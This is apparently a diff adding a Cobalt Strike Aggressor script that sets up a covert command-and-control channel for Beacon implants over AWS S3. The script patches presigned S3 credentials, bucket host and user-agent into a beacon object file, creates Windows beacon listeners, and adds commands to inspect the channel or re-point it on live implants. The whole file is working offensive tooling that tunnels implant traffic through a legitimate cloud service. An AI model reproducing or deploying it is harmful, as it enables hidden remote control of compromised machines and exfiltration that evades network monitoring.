@@ -1,0 +1,435 @@
+import java.io.File;
+debug(7);
+
+global('%ACT %CFG');
+
+# %CFG is a map of configurable listener fields that are patched into the BOF
+# or may be updated at runtime. Each entry maps a human-readable key to a small
+# descriptor used by the UI and by the packing/patching routines:
+#
+#  pack => format specifier for bof_pack
+#  enum => numeric identifier for the field (see: s3-udc2-bof/s3-udc2-migrate.cpp)
+#  len  => maximum size in bytes allowed for patching/packing
+#  egg  => placeholder string (the "egg") embedded in the BOF binary
+#          which will be searched for and replaced when patching
+#
+# Keys and their meaning:
+#  max-frame-retries   - retry count for polling (int)
+#  frame-retry-delay   - delay in milliseconds between retry attempts (int)
+#  s3-host             - S3 host name, stored as UTF-16LE (wchar_t[128])
+#  s3-upload-key       - upload key prefix (char[32]) used for Beacon->TS
+#  s3-x-amz-credential - x-amz-credential form field (char[128])
+#  s3-x-amz-date       - x-amz-date form field (char[32])
+#  s3-x-amz-signature  - x-amz-signature form field (char[128])
+#  s3-x-amz-policy     - x-amz-policy form field (char[1024])
+#  s3-download-key     - download key/prefix (char[32]) used for TS->Beacon
+#  user-agent          - User-Agent header, stored as UTF-16LE (wchar_t[128])
+#
+# For more info, see: s3-udc2-bof/s3-udc2.h
+
+%CFG  = %(
+    max-frame-retries   => %(pack => "i", enum => 0),
+    frame-retry-delay   => %(pack => "i", enum => 1),
+    s3-host             => %(pack => "Z", enum => 2, len => 2 * 128, egg => str_encode("<PATCH-ME-HOST>", "UTF-16LE")),
+    s3-upload-key       => %(pack => "z", enum => 3, len => 32,      egg => "<PATCH-ME-UPLOAD-KEY>"),
+    s3-x-amz-credential => %(pack => "z", enum => 4, len => 128,     egg => "<PATCH-ME-X-AMZ-CREDENTIAL>"),
+    s3-x-amz-date       => %(pack => "z", enum => 5, len => 32,      egg => "<PATCH-ME-X-AMZ-DATE>"),
+    s3-x-amz-signature  => %(pack => "z", enum => 6, len => 128,     egg => "<PATCH-ME-X-AMZ-SIGNATURE>"),
+    s3-x-amz-policy     => %(pack => "z", enum => 7, len => 1024,    egg => "<PATCH-ME-X-AMZ-POLICY>"),
+    s3-download-key     => %(pack => "z", enum => 8, len => 32,      egg => "<PATCH-ME-DOWNLOAD-KEY>"),
+    user-agent          => %(pack => "Z", enum => 9, len => 2 * 128, egg => str_encode("<PATCH-ME-USER-AGENT>", "UTF-16LE")),
+);
+
+# %ACT holds the "action" identifier values for the s3-udc2-migrate BOF.
+%ACT = %(
+    dump    => 0, # Print the current state
+    migrate => 1, # Update the state
+    policy  => 2, # Query just the policy field
+);
+
+sub ok {
+    return lambda({ return %(isOk => 1, isErr => 0, value => $value)[$0]; }, $value => $1);
+}
+
+sub err {
+    return lambda({ return %(isOk => 0, isErr => 1, value => $value)[$0]; }, $value => $1);
+}
+
+beacon_command_group(
+   "s3-udc2",
+   "AWS S3 UDC2",
+   "Control the S3 UDC2 channel"
+);
+
+beacon_command_register(
+   "s3-udc2-state",
+   "Print the UDC2 state",
+   "Usage: s3-udc2-state",
+   "s3-udc2"
+);
+
+alias s3-udc2-state {
+    btask($1, "Tasked Beacon to print the S3 UDC2 configuration");
+    run($1, bof_pack($1, "i", %ACT['dump']));
+}
+
+beacon_command_register(
+   "s3-udc2-expiry",
+   "Query the presigned URL expiration",
+   "Usage: s3-udc2-expiry",
+   "s3-udc2"
+);
+
+alias s3-udc2-expiry {
+    btask($1, "Tasked Beacon to query the presigned URL expiration date");
+    run($1, bof_pack($1, "i", %ACT['policy']), {
+        local('$policy $date $expires $delta');
+        if ($3['type'] eq "output") {
+            $policy = base64_decode($2);
+            if ($policy hasmatch '"expiration"\s*:\s*"([^"]*)"') {
+
+                $date = matched()[0];
+                $expires = parseDate("yyyy-MM-dd'T'HH:mm:ssX", $date);
+                $delta = $expires - ticks();
+                blog($1, "Expiration date: $date (" . format_delta_time($delta) . ")");
+            }
+            else {
+                berror($1, "could not parse the expiration timestamp: $policy");
+            }
+        }
+        else if ($3['type'] eq "error") {
+            berror($1, $2);
+        }
+    });
+}
+
+beacon_command_register(
+   "s3-udc2-migrate-ex",
+   "Modify the indivual properties in the UDC2 state",
+   "Usage: s3-udc2-migrate-ex [key] [value] ...\n\n" .
+   "Change the property in the UDC2 state. You can provide multiple key value pairs.\n\n" .
+   "NOTE: Be careful. You can easily break the auth and lose your Beacon",
+   "s3-udc2"
+);
+
+alias s3-udc2-migrate-ex {
+    local('$bid $cfg $args %state $i')
+    $bid = $1;
+    shift(@_);
+
+    if ((size(@_) % 2) != 0) { return berror($1, "not even amount of arguments"); }
+    %state = %();
+
+    for ($i = 0; $i < size(@_); $i += 2) {
+        %state[@_[$i]] = @_[$i + 1];
+    }
+
+    $cfg = build_config($1, %state);
+    if ([$cfg isErr]) { return berror($1, [$cfg value]); }
+    $args = bof_pack($1, "i", %ACT['migrate']) . [$cfg value];
+
+    btask($1, "Tasked Beacon to migrate S3 UDC2 configuration");
+    run($1, $args);
+}
+
+set s3-udc2-migrate-ex_BEACON_CONSOLE_TAB_KEY {
+    local('@tokens $cnt $last @keys');
+
+    @tokens = split(" ", $2);
+    $cnt = size(@tokens);
+    $last = right($2, 1);
+
+    if ($last eq " ") {
+        $cnt++;
+    }
+
+    if (($cnt % 2) == 0) {
+        @keys = keys(%CFG);
+        if ($last ne " ") {
+            @keys = filter(
+                lambda({ return iff(left($1, strlen($prefix)) eq $prefix, substr($1, strlen($prefix)), $null); },
+                    $prefix => @tokens[size(@tokens)-1]
+                ), @keys);
+        }
+        return join("\t", map(lambda({ return "$cmd $+ $1"; }, $cmd => $2), @keys));
+    }
+
+    return $2;
+}
+
+beacon_command_register(
+   "s3-udc2-migrate",
+   "Push a new UDC2 state from a file",
+   "Usage: s3-udc2-migrate [state file]\n\n" .
+   "Load a new UDC2 state from a file.\n\n" .
+   "NOTE: Be careful. You can easily break the auth and lose your Beacon",
+   "s3-udc2"
+);
+
+alias s3-udc2-migrate {
+    local('$bid $cfg $args $data $state')
+    $bid = $1;
+
+    $state = read_state_file($2);
+    if ([$state isErr]) { return show_error([$state value]); }
+
+    btask($1, "Tasked Beacon to migrate S3 UDC2 configuration");
+
+    $cfg = build_config($1, [$state value]);
+    if ([$cfg isErr]) { return berror($1, [$cfg value]); }
+    $args = bof_pack($1, "i", %ACT['migrate']) . [$cfg value];
+
+    run($1, $args);
+}
+
+set s3-udc2-migrate_BEACON_CONSOLE_TAB_KEY {
+    local('@tokens $path $cmd $parent $name @files');
+
+    @tokens = split(" ", $2, 2);
+    if (size(@tokens) != 2) {
+        return $2;
+    }
+    $cmd = @tokens[0];
+    $path = @tokens[1];
+
+    if (-isDir $path) {
+       return join("\t", map(lambda({ return "$cmd $1"; }, \$cmd), ls($path)));
+    }
+
+    $parent = getFileParent($path);
+    $name = getFileName($path);
+
+    if (-isDir $parent) {
+        @files = filter(lambda({
+                local('$n');
+                $n = getFileName($1);
+                return iff(strlen($1) >= strlen($n) && left($n, strlen($name)) eq $name, $1, $null);
+            }, \$name),
+            ls($parent));
+        return join("\t", map(lambda({ return "$cmd $1"; }, \$cmd), @files));
+    }
+
+    return $2;
+}
+
+sub run {
+    local('$path $barch $handle $data $args');
+
+    $barch  = barch($1);
+    $path   = script_resource("bofs/s3-udc2-migrate. $+ $barch $+ .o");
+    $handle = openf($path);
+    if (checkError()) { return berror($1, "Could not open: $path"); }
+
+    $data = readb($handle, -1);
+    closef($handle);
+
+    beacon_inline_execute($1, $data, "go", $2, @_[2]);
+}
+
+sub build_config {
+    local('$i $args $cnt $key $value $cfg');
+    $cnt = 0;
+    $args = "";
+    foreach $key => $value ($2) {
+        $cfg = %CFG[$key];
+        if ($cfg !is $null) {
+            if ($key eq "s3-upload-key") {
+                $value = $value . "/\${filename}";
+            }
+            blog($1, "$key -> $value");
+            $args .= bof_pack($1, "i" . $cfg['pack'], $cfg['enum'], $value);
+            $cnt++;
+        }
+        else {
+            return err("Unknown state key: " . $key);
+        }
+    }
+    blog($1, "state packed")
+    return ok(bof_pack($1, "i", $cnt) . $args);
+}
+
+sub read_state_file {
+    local('$f $ln %state $key $value');
+    $f = openf($1);
+    if (checkError()) { return err("Could not open: $2"); }
+   
+    %state = %();
+    while $ln (readln($f)) {
+        if ($ln ismatch '([^=]+)=(.*)') {
+            ($key, $value) = matched();
+            if ($key !in %CFG) { close($f); return err("Invalid key: $key"); }
+            %state[$key] = $value;
+        }
+        else {
+            closef($f);
+            return err("Invalid line: $ln");
+        }
+    }
+    closef($f);
+
+    return ok(%state);
+}
+
+sub format_delta_time {
+    local('$days $hours $minutes $seconds');
+
+    $seconds = long($1 / 1000);
+
+    $days = $seconds / 86400;
+    $seconds = $seconds % 86400;
+
+    $hours = $seconds / 3600;
+    $seconds = $seconds % 3600;
+
+    $minutes = $seconds / 60;
+    $seconds = $seconds % 60;
+
+    return "$days $+ d $hours $+ h $minutes $+ m $seconds $+ s";
+}
+
+sub null_pad {
+    local('$s $len');
+    ($s, $len) = @_;
+
+    while (strlen($s) < $len) {
+        $s = $s . "\x00";
+    }
+
+    return $s;
+}
+
+sub patch_udc2_bof {
+    local('$f $bof $name $egg $value $path $loc $patch');
+
+    $path = getFileProper(script_resource("bofs"), $1);
+    if (!-exists $path || !-isFile $path) {
+        return err("Could not patch the udc2 bof: ' $+ $path $+ ' doesn't exist");
+    }
+
+    $f = openf($path);
+    if (checkError()) { return err("Could not open file: $path"); }
+    $bof = readb($f, -1);
+    closef($f);
+
+    foreach $name => $value ($2) {
+        $egg = %CFG[$name]['egg'];
+        if ($egg is $null) { continue; }
+        if ($name eq "s3-upload-key") {
+            $value = $value . "/\${filename}";
+        }
+        if (%CFG[$name]['pack'] eq "Z") {
+            $patch = str_encode($value, "UTF-16LE") . "\x00\x00";
+        }
+        else {
+            $patch = $value . "\x00";
+        }
+
+        if (strlen($patch) > %CFG[$name]['len']) {
+            return err("Could not patch the udc2 bof: the value for $key is too long, max size is " + %CFG[$name]['len']);
+        }
+
+        $patch = null_pad($patch, strlen($egg));
+        $loc = find($bof, $egg);
+        if ($loc is $null) {
+            return err("Could not find the egg value for $name");
+        }
+
+        $bof = left($bof, $loc) . $patch. substr($bof, $loc + strlen($patch));
+    }
+
+    $path = [[File createTempFile: "s3-udc2-patched-", ".o"] getAbsolutePath];
+    $f = openf(">" . $path);
+    if (checkError()) { return err("Could not open file: $path"); }
+    writeb($f, $bof);
+    closef($f);
+    return ok($path);
+}
+
+sub create_s3_udc2_listener_from_state_file {
+    prompt_file_open("Choose a state file", $null, false, {
+        local('$state $props');
+        $state = read_state_file($1);
+        if ([$state isErr]) { return show_error([$state value]); }
+        show_create_s3_udc2_listener_dialog([$state value]);
+
+    });
+}
+
+sub create_s3_udc2_listener {
+    local('$bof_x64_path $bof_x86_path $name')
+    $name = $1['name'];
+    $bof_x64_path = patch_udc2_bof("s3-udc2-patchable.x64.o", $1);
+    $bof_x86_path = patch_udc2_bof("s3-udc2-patchable.x86.o", $1);
+
+    if ([$bof_x64_path isOk]) {
+        listener_create_ext("$name $+ -x64", "windows/beacon_udc2", %(
+            beacons => iff($1['localonly'] eq "true", "127.0.0.1", "0.0.0.0"),
+            port => $1["port"],
+            localonly => $1["localonly"],
+            profile => "",
+            bof => [$bof_x64_path value]
+        ));
+    } else {
+        return show_error([$bof_x64_path value]);
+    }
+
+    if ([$bof_x86_path isOk]) {
+        listener_create_ext("$name $+ -x86", "windows/beacon_udc2", %(
+            beacons => iff($1['localonly'] eq "true", "127.0.0.1", "0.0.0.0"),
+            port => parseNumber($1["port"]) + 1,
+            localonly => $1["localonly"],
+            profile => "",
+            bof => [$bof_x86_path value]
+        ));
+    } else {
+        return show_error([$bof_x86_path value]);
+    }
+
+}
+
+sub show_create_s3_udc2_listener_dialog {
+    local('$dlg');
+    $1['port'] = 3333;
+    $1['user-agent'] = "s3-udc";
+    $dlg = dialog("Create S3 UDC2 Listener", $1, { create_s3_udc2_listener($3); });
+    dialog_description(
+        $dlg,
+        "The S3 UDC2 listener requires the following properties:\n\n" .
+        "S3 Host: The hostname of the S3 bucket.\n" .
+        "S3 Upload Key Prefix: Key prefix for Beacon → TS frames. Frames are uploaded to <prefix>/<session id>.\n" .
+        "S3 Download Key Prefix: Key prefix for TS → Beacon frames. Frames are downloaded from https://<s3-host>/<prefix>/<session id>.\n" .
+        "s3-x-amz-*: Authentication parameters for the presigned POST upload URL.\n" .
+        "User-Agent: The User-Agent header to use for HTTP requests.",
+        7
+    );
+     
+    drow_text($dlg, "name", "Listener Name:");
+
+    drow_text($dlg, "s3-host",             "S3 Host:");
+    drow_text($dlg, "s3-upload-key",       "S3 Upload Key Prefix:");
+    drow_text($dlg, "s3-download-key",     "S3 Download Key Prefix:");
+    drow_text($dlg, "s3-x-amz-credential", "x-amz-credential:");
+    drow_text($dlg, "s3-x-amz-date",       "x-amz-date:");
+    drow_text($dlg, "s3-x-amz-signature",  "x-amz-signature:");
+    drow_text($dlg, "s3-x-amz-policy",     "x-amz-policy:");
+    drow_text($dlg, "user-agent",          "User-Agent:");
+
+    drow_text($dlg,     "port",          "Port (Bind):");
+    drow_checkbox($dlg, "localonly", "", "Bind to localhost only");
+
+    dbutton_action($dlg, "Create");
+    dbutton_help($dlg,   "TODO: Insert url");
+     
+    dialog_show($dlg);
+}
+
+popup s3-udc2 {
+    item "Import Listener" {
+        create_s3_udc2_listener_from_state_file();
+    }
+    item "Create Listener" {
+        show_create_s3_udc2_listener_dialog(%(s3-upload-key => "c2s", s3-download-key => "s2c"))
+    }
+}
+
+menubar("S3-UDC2", "s3-udc2");
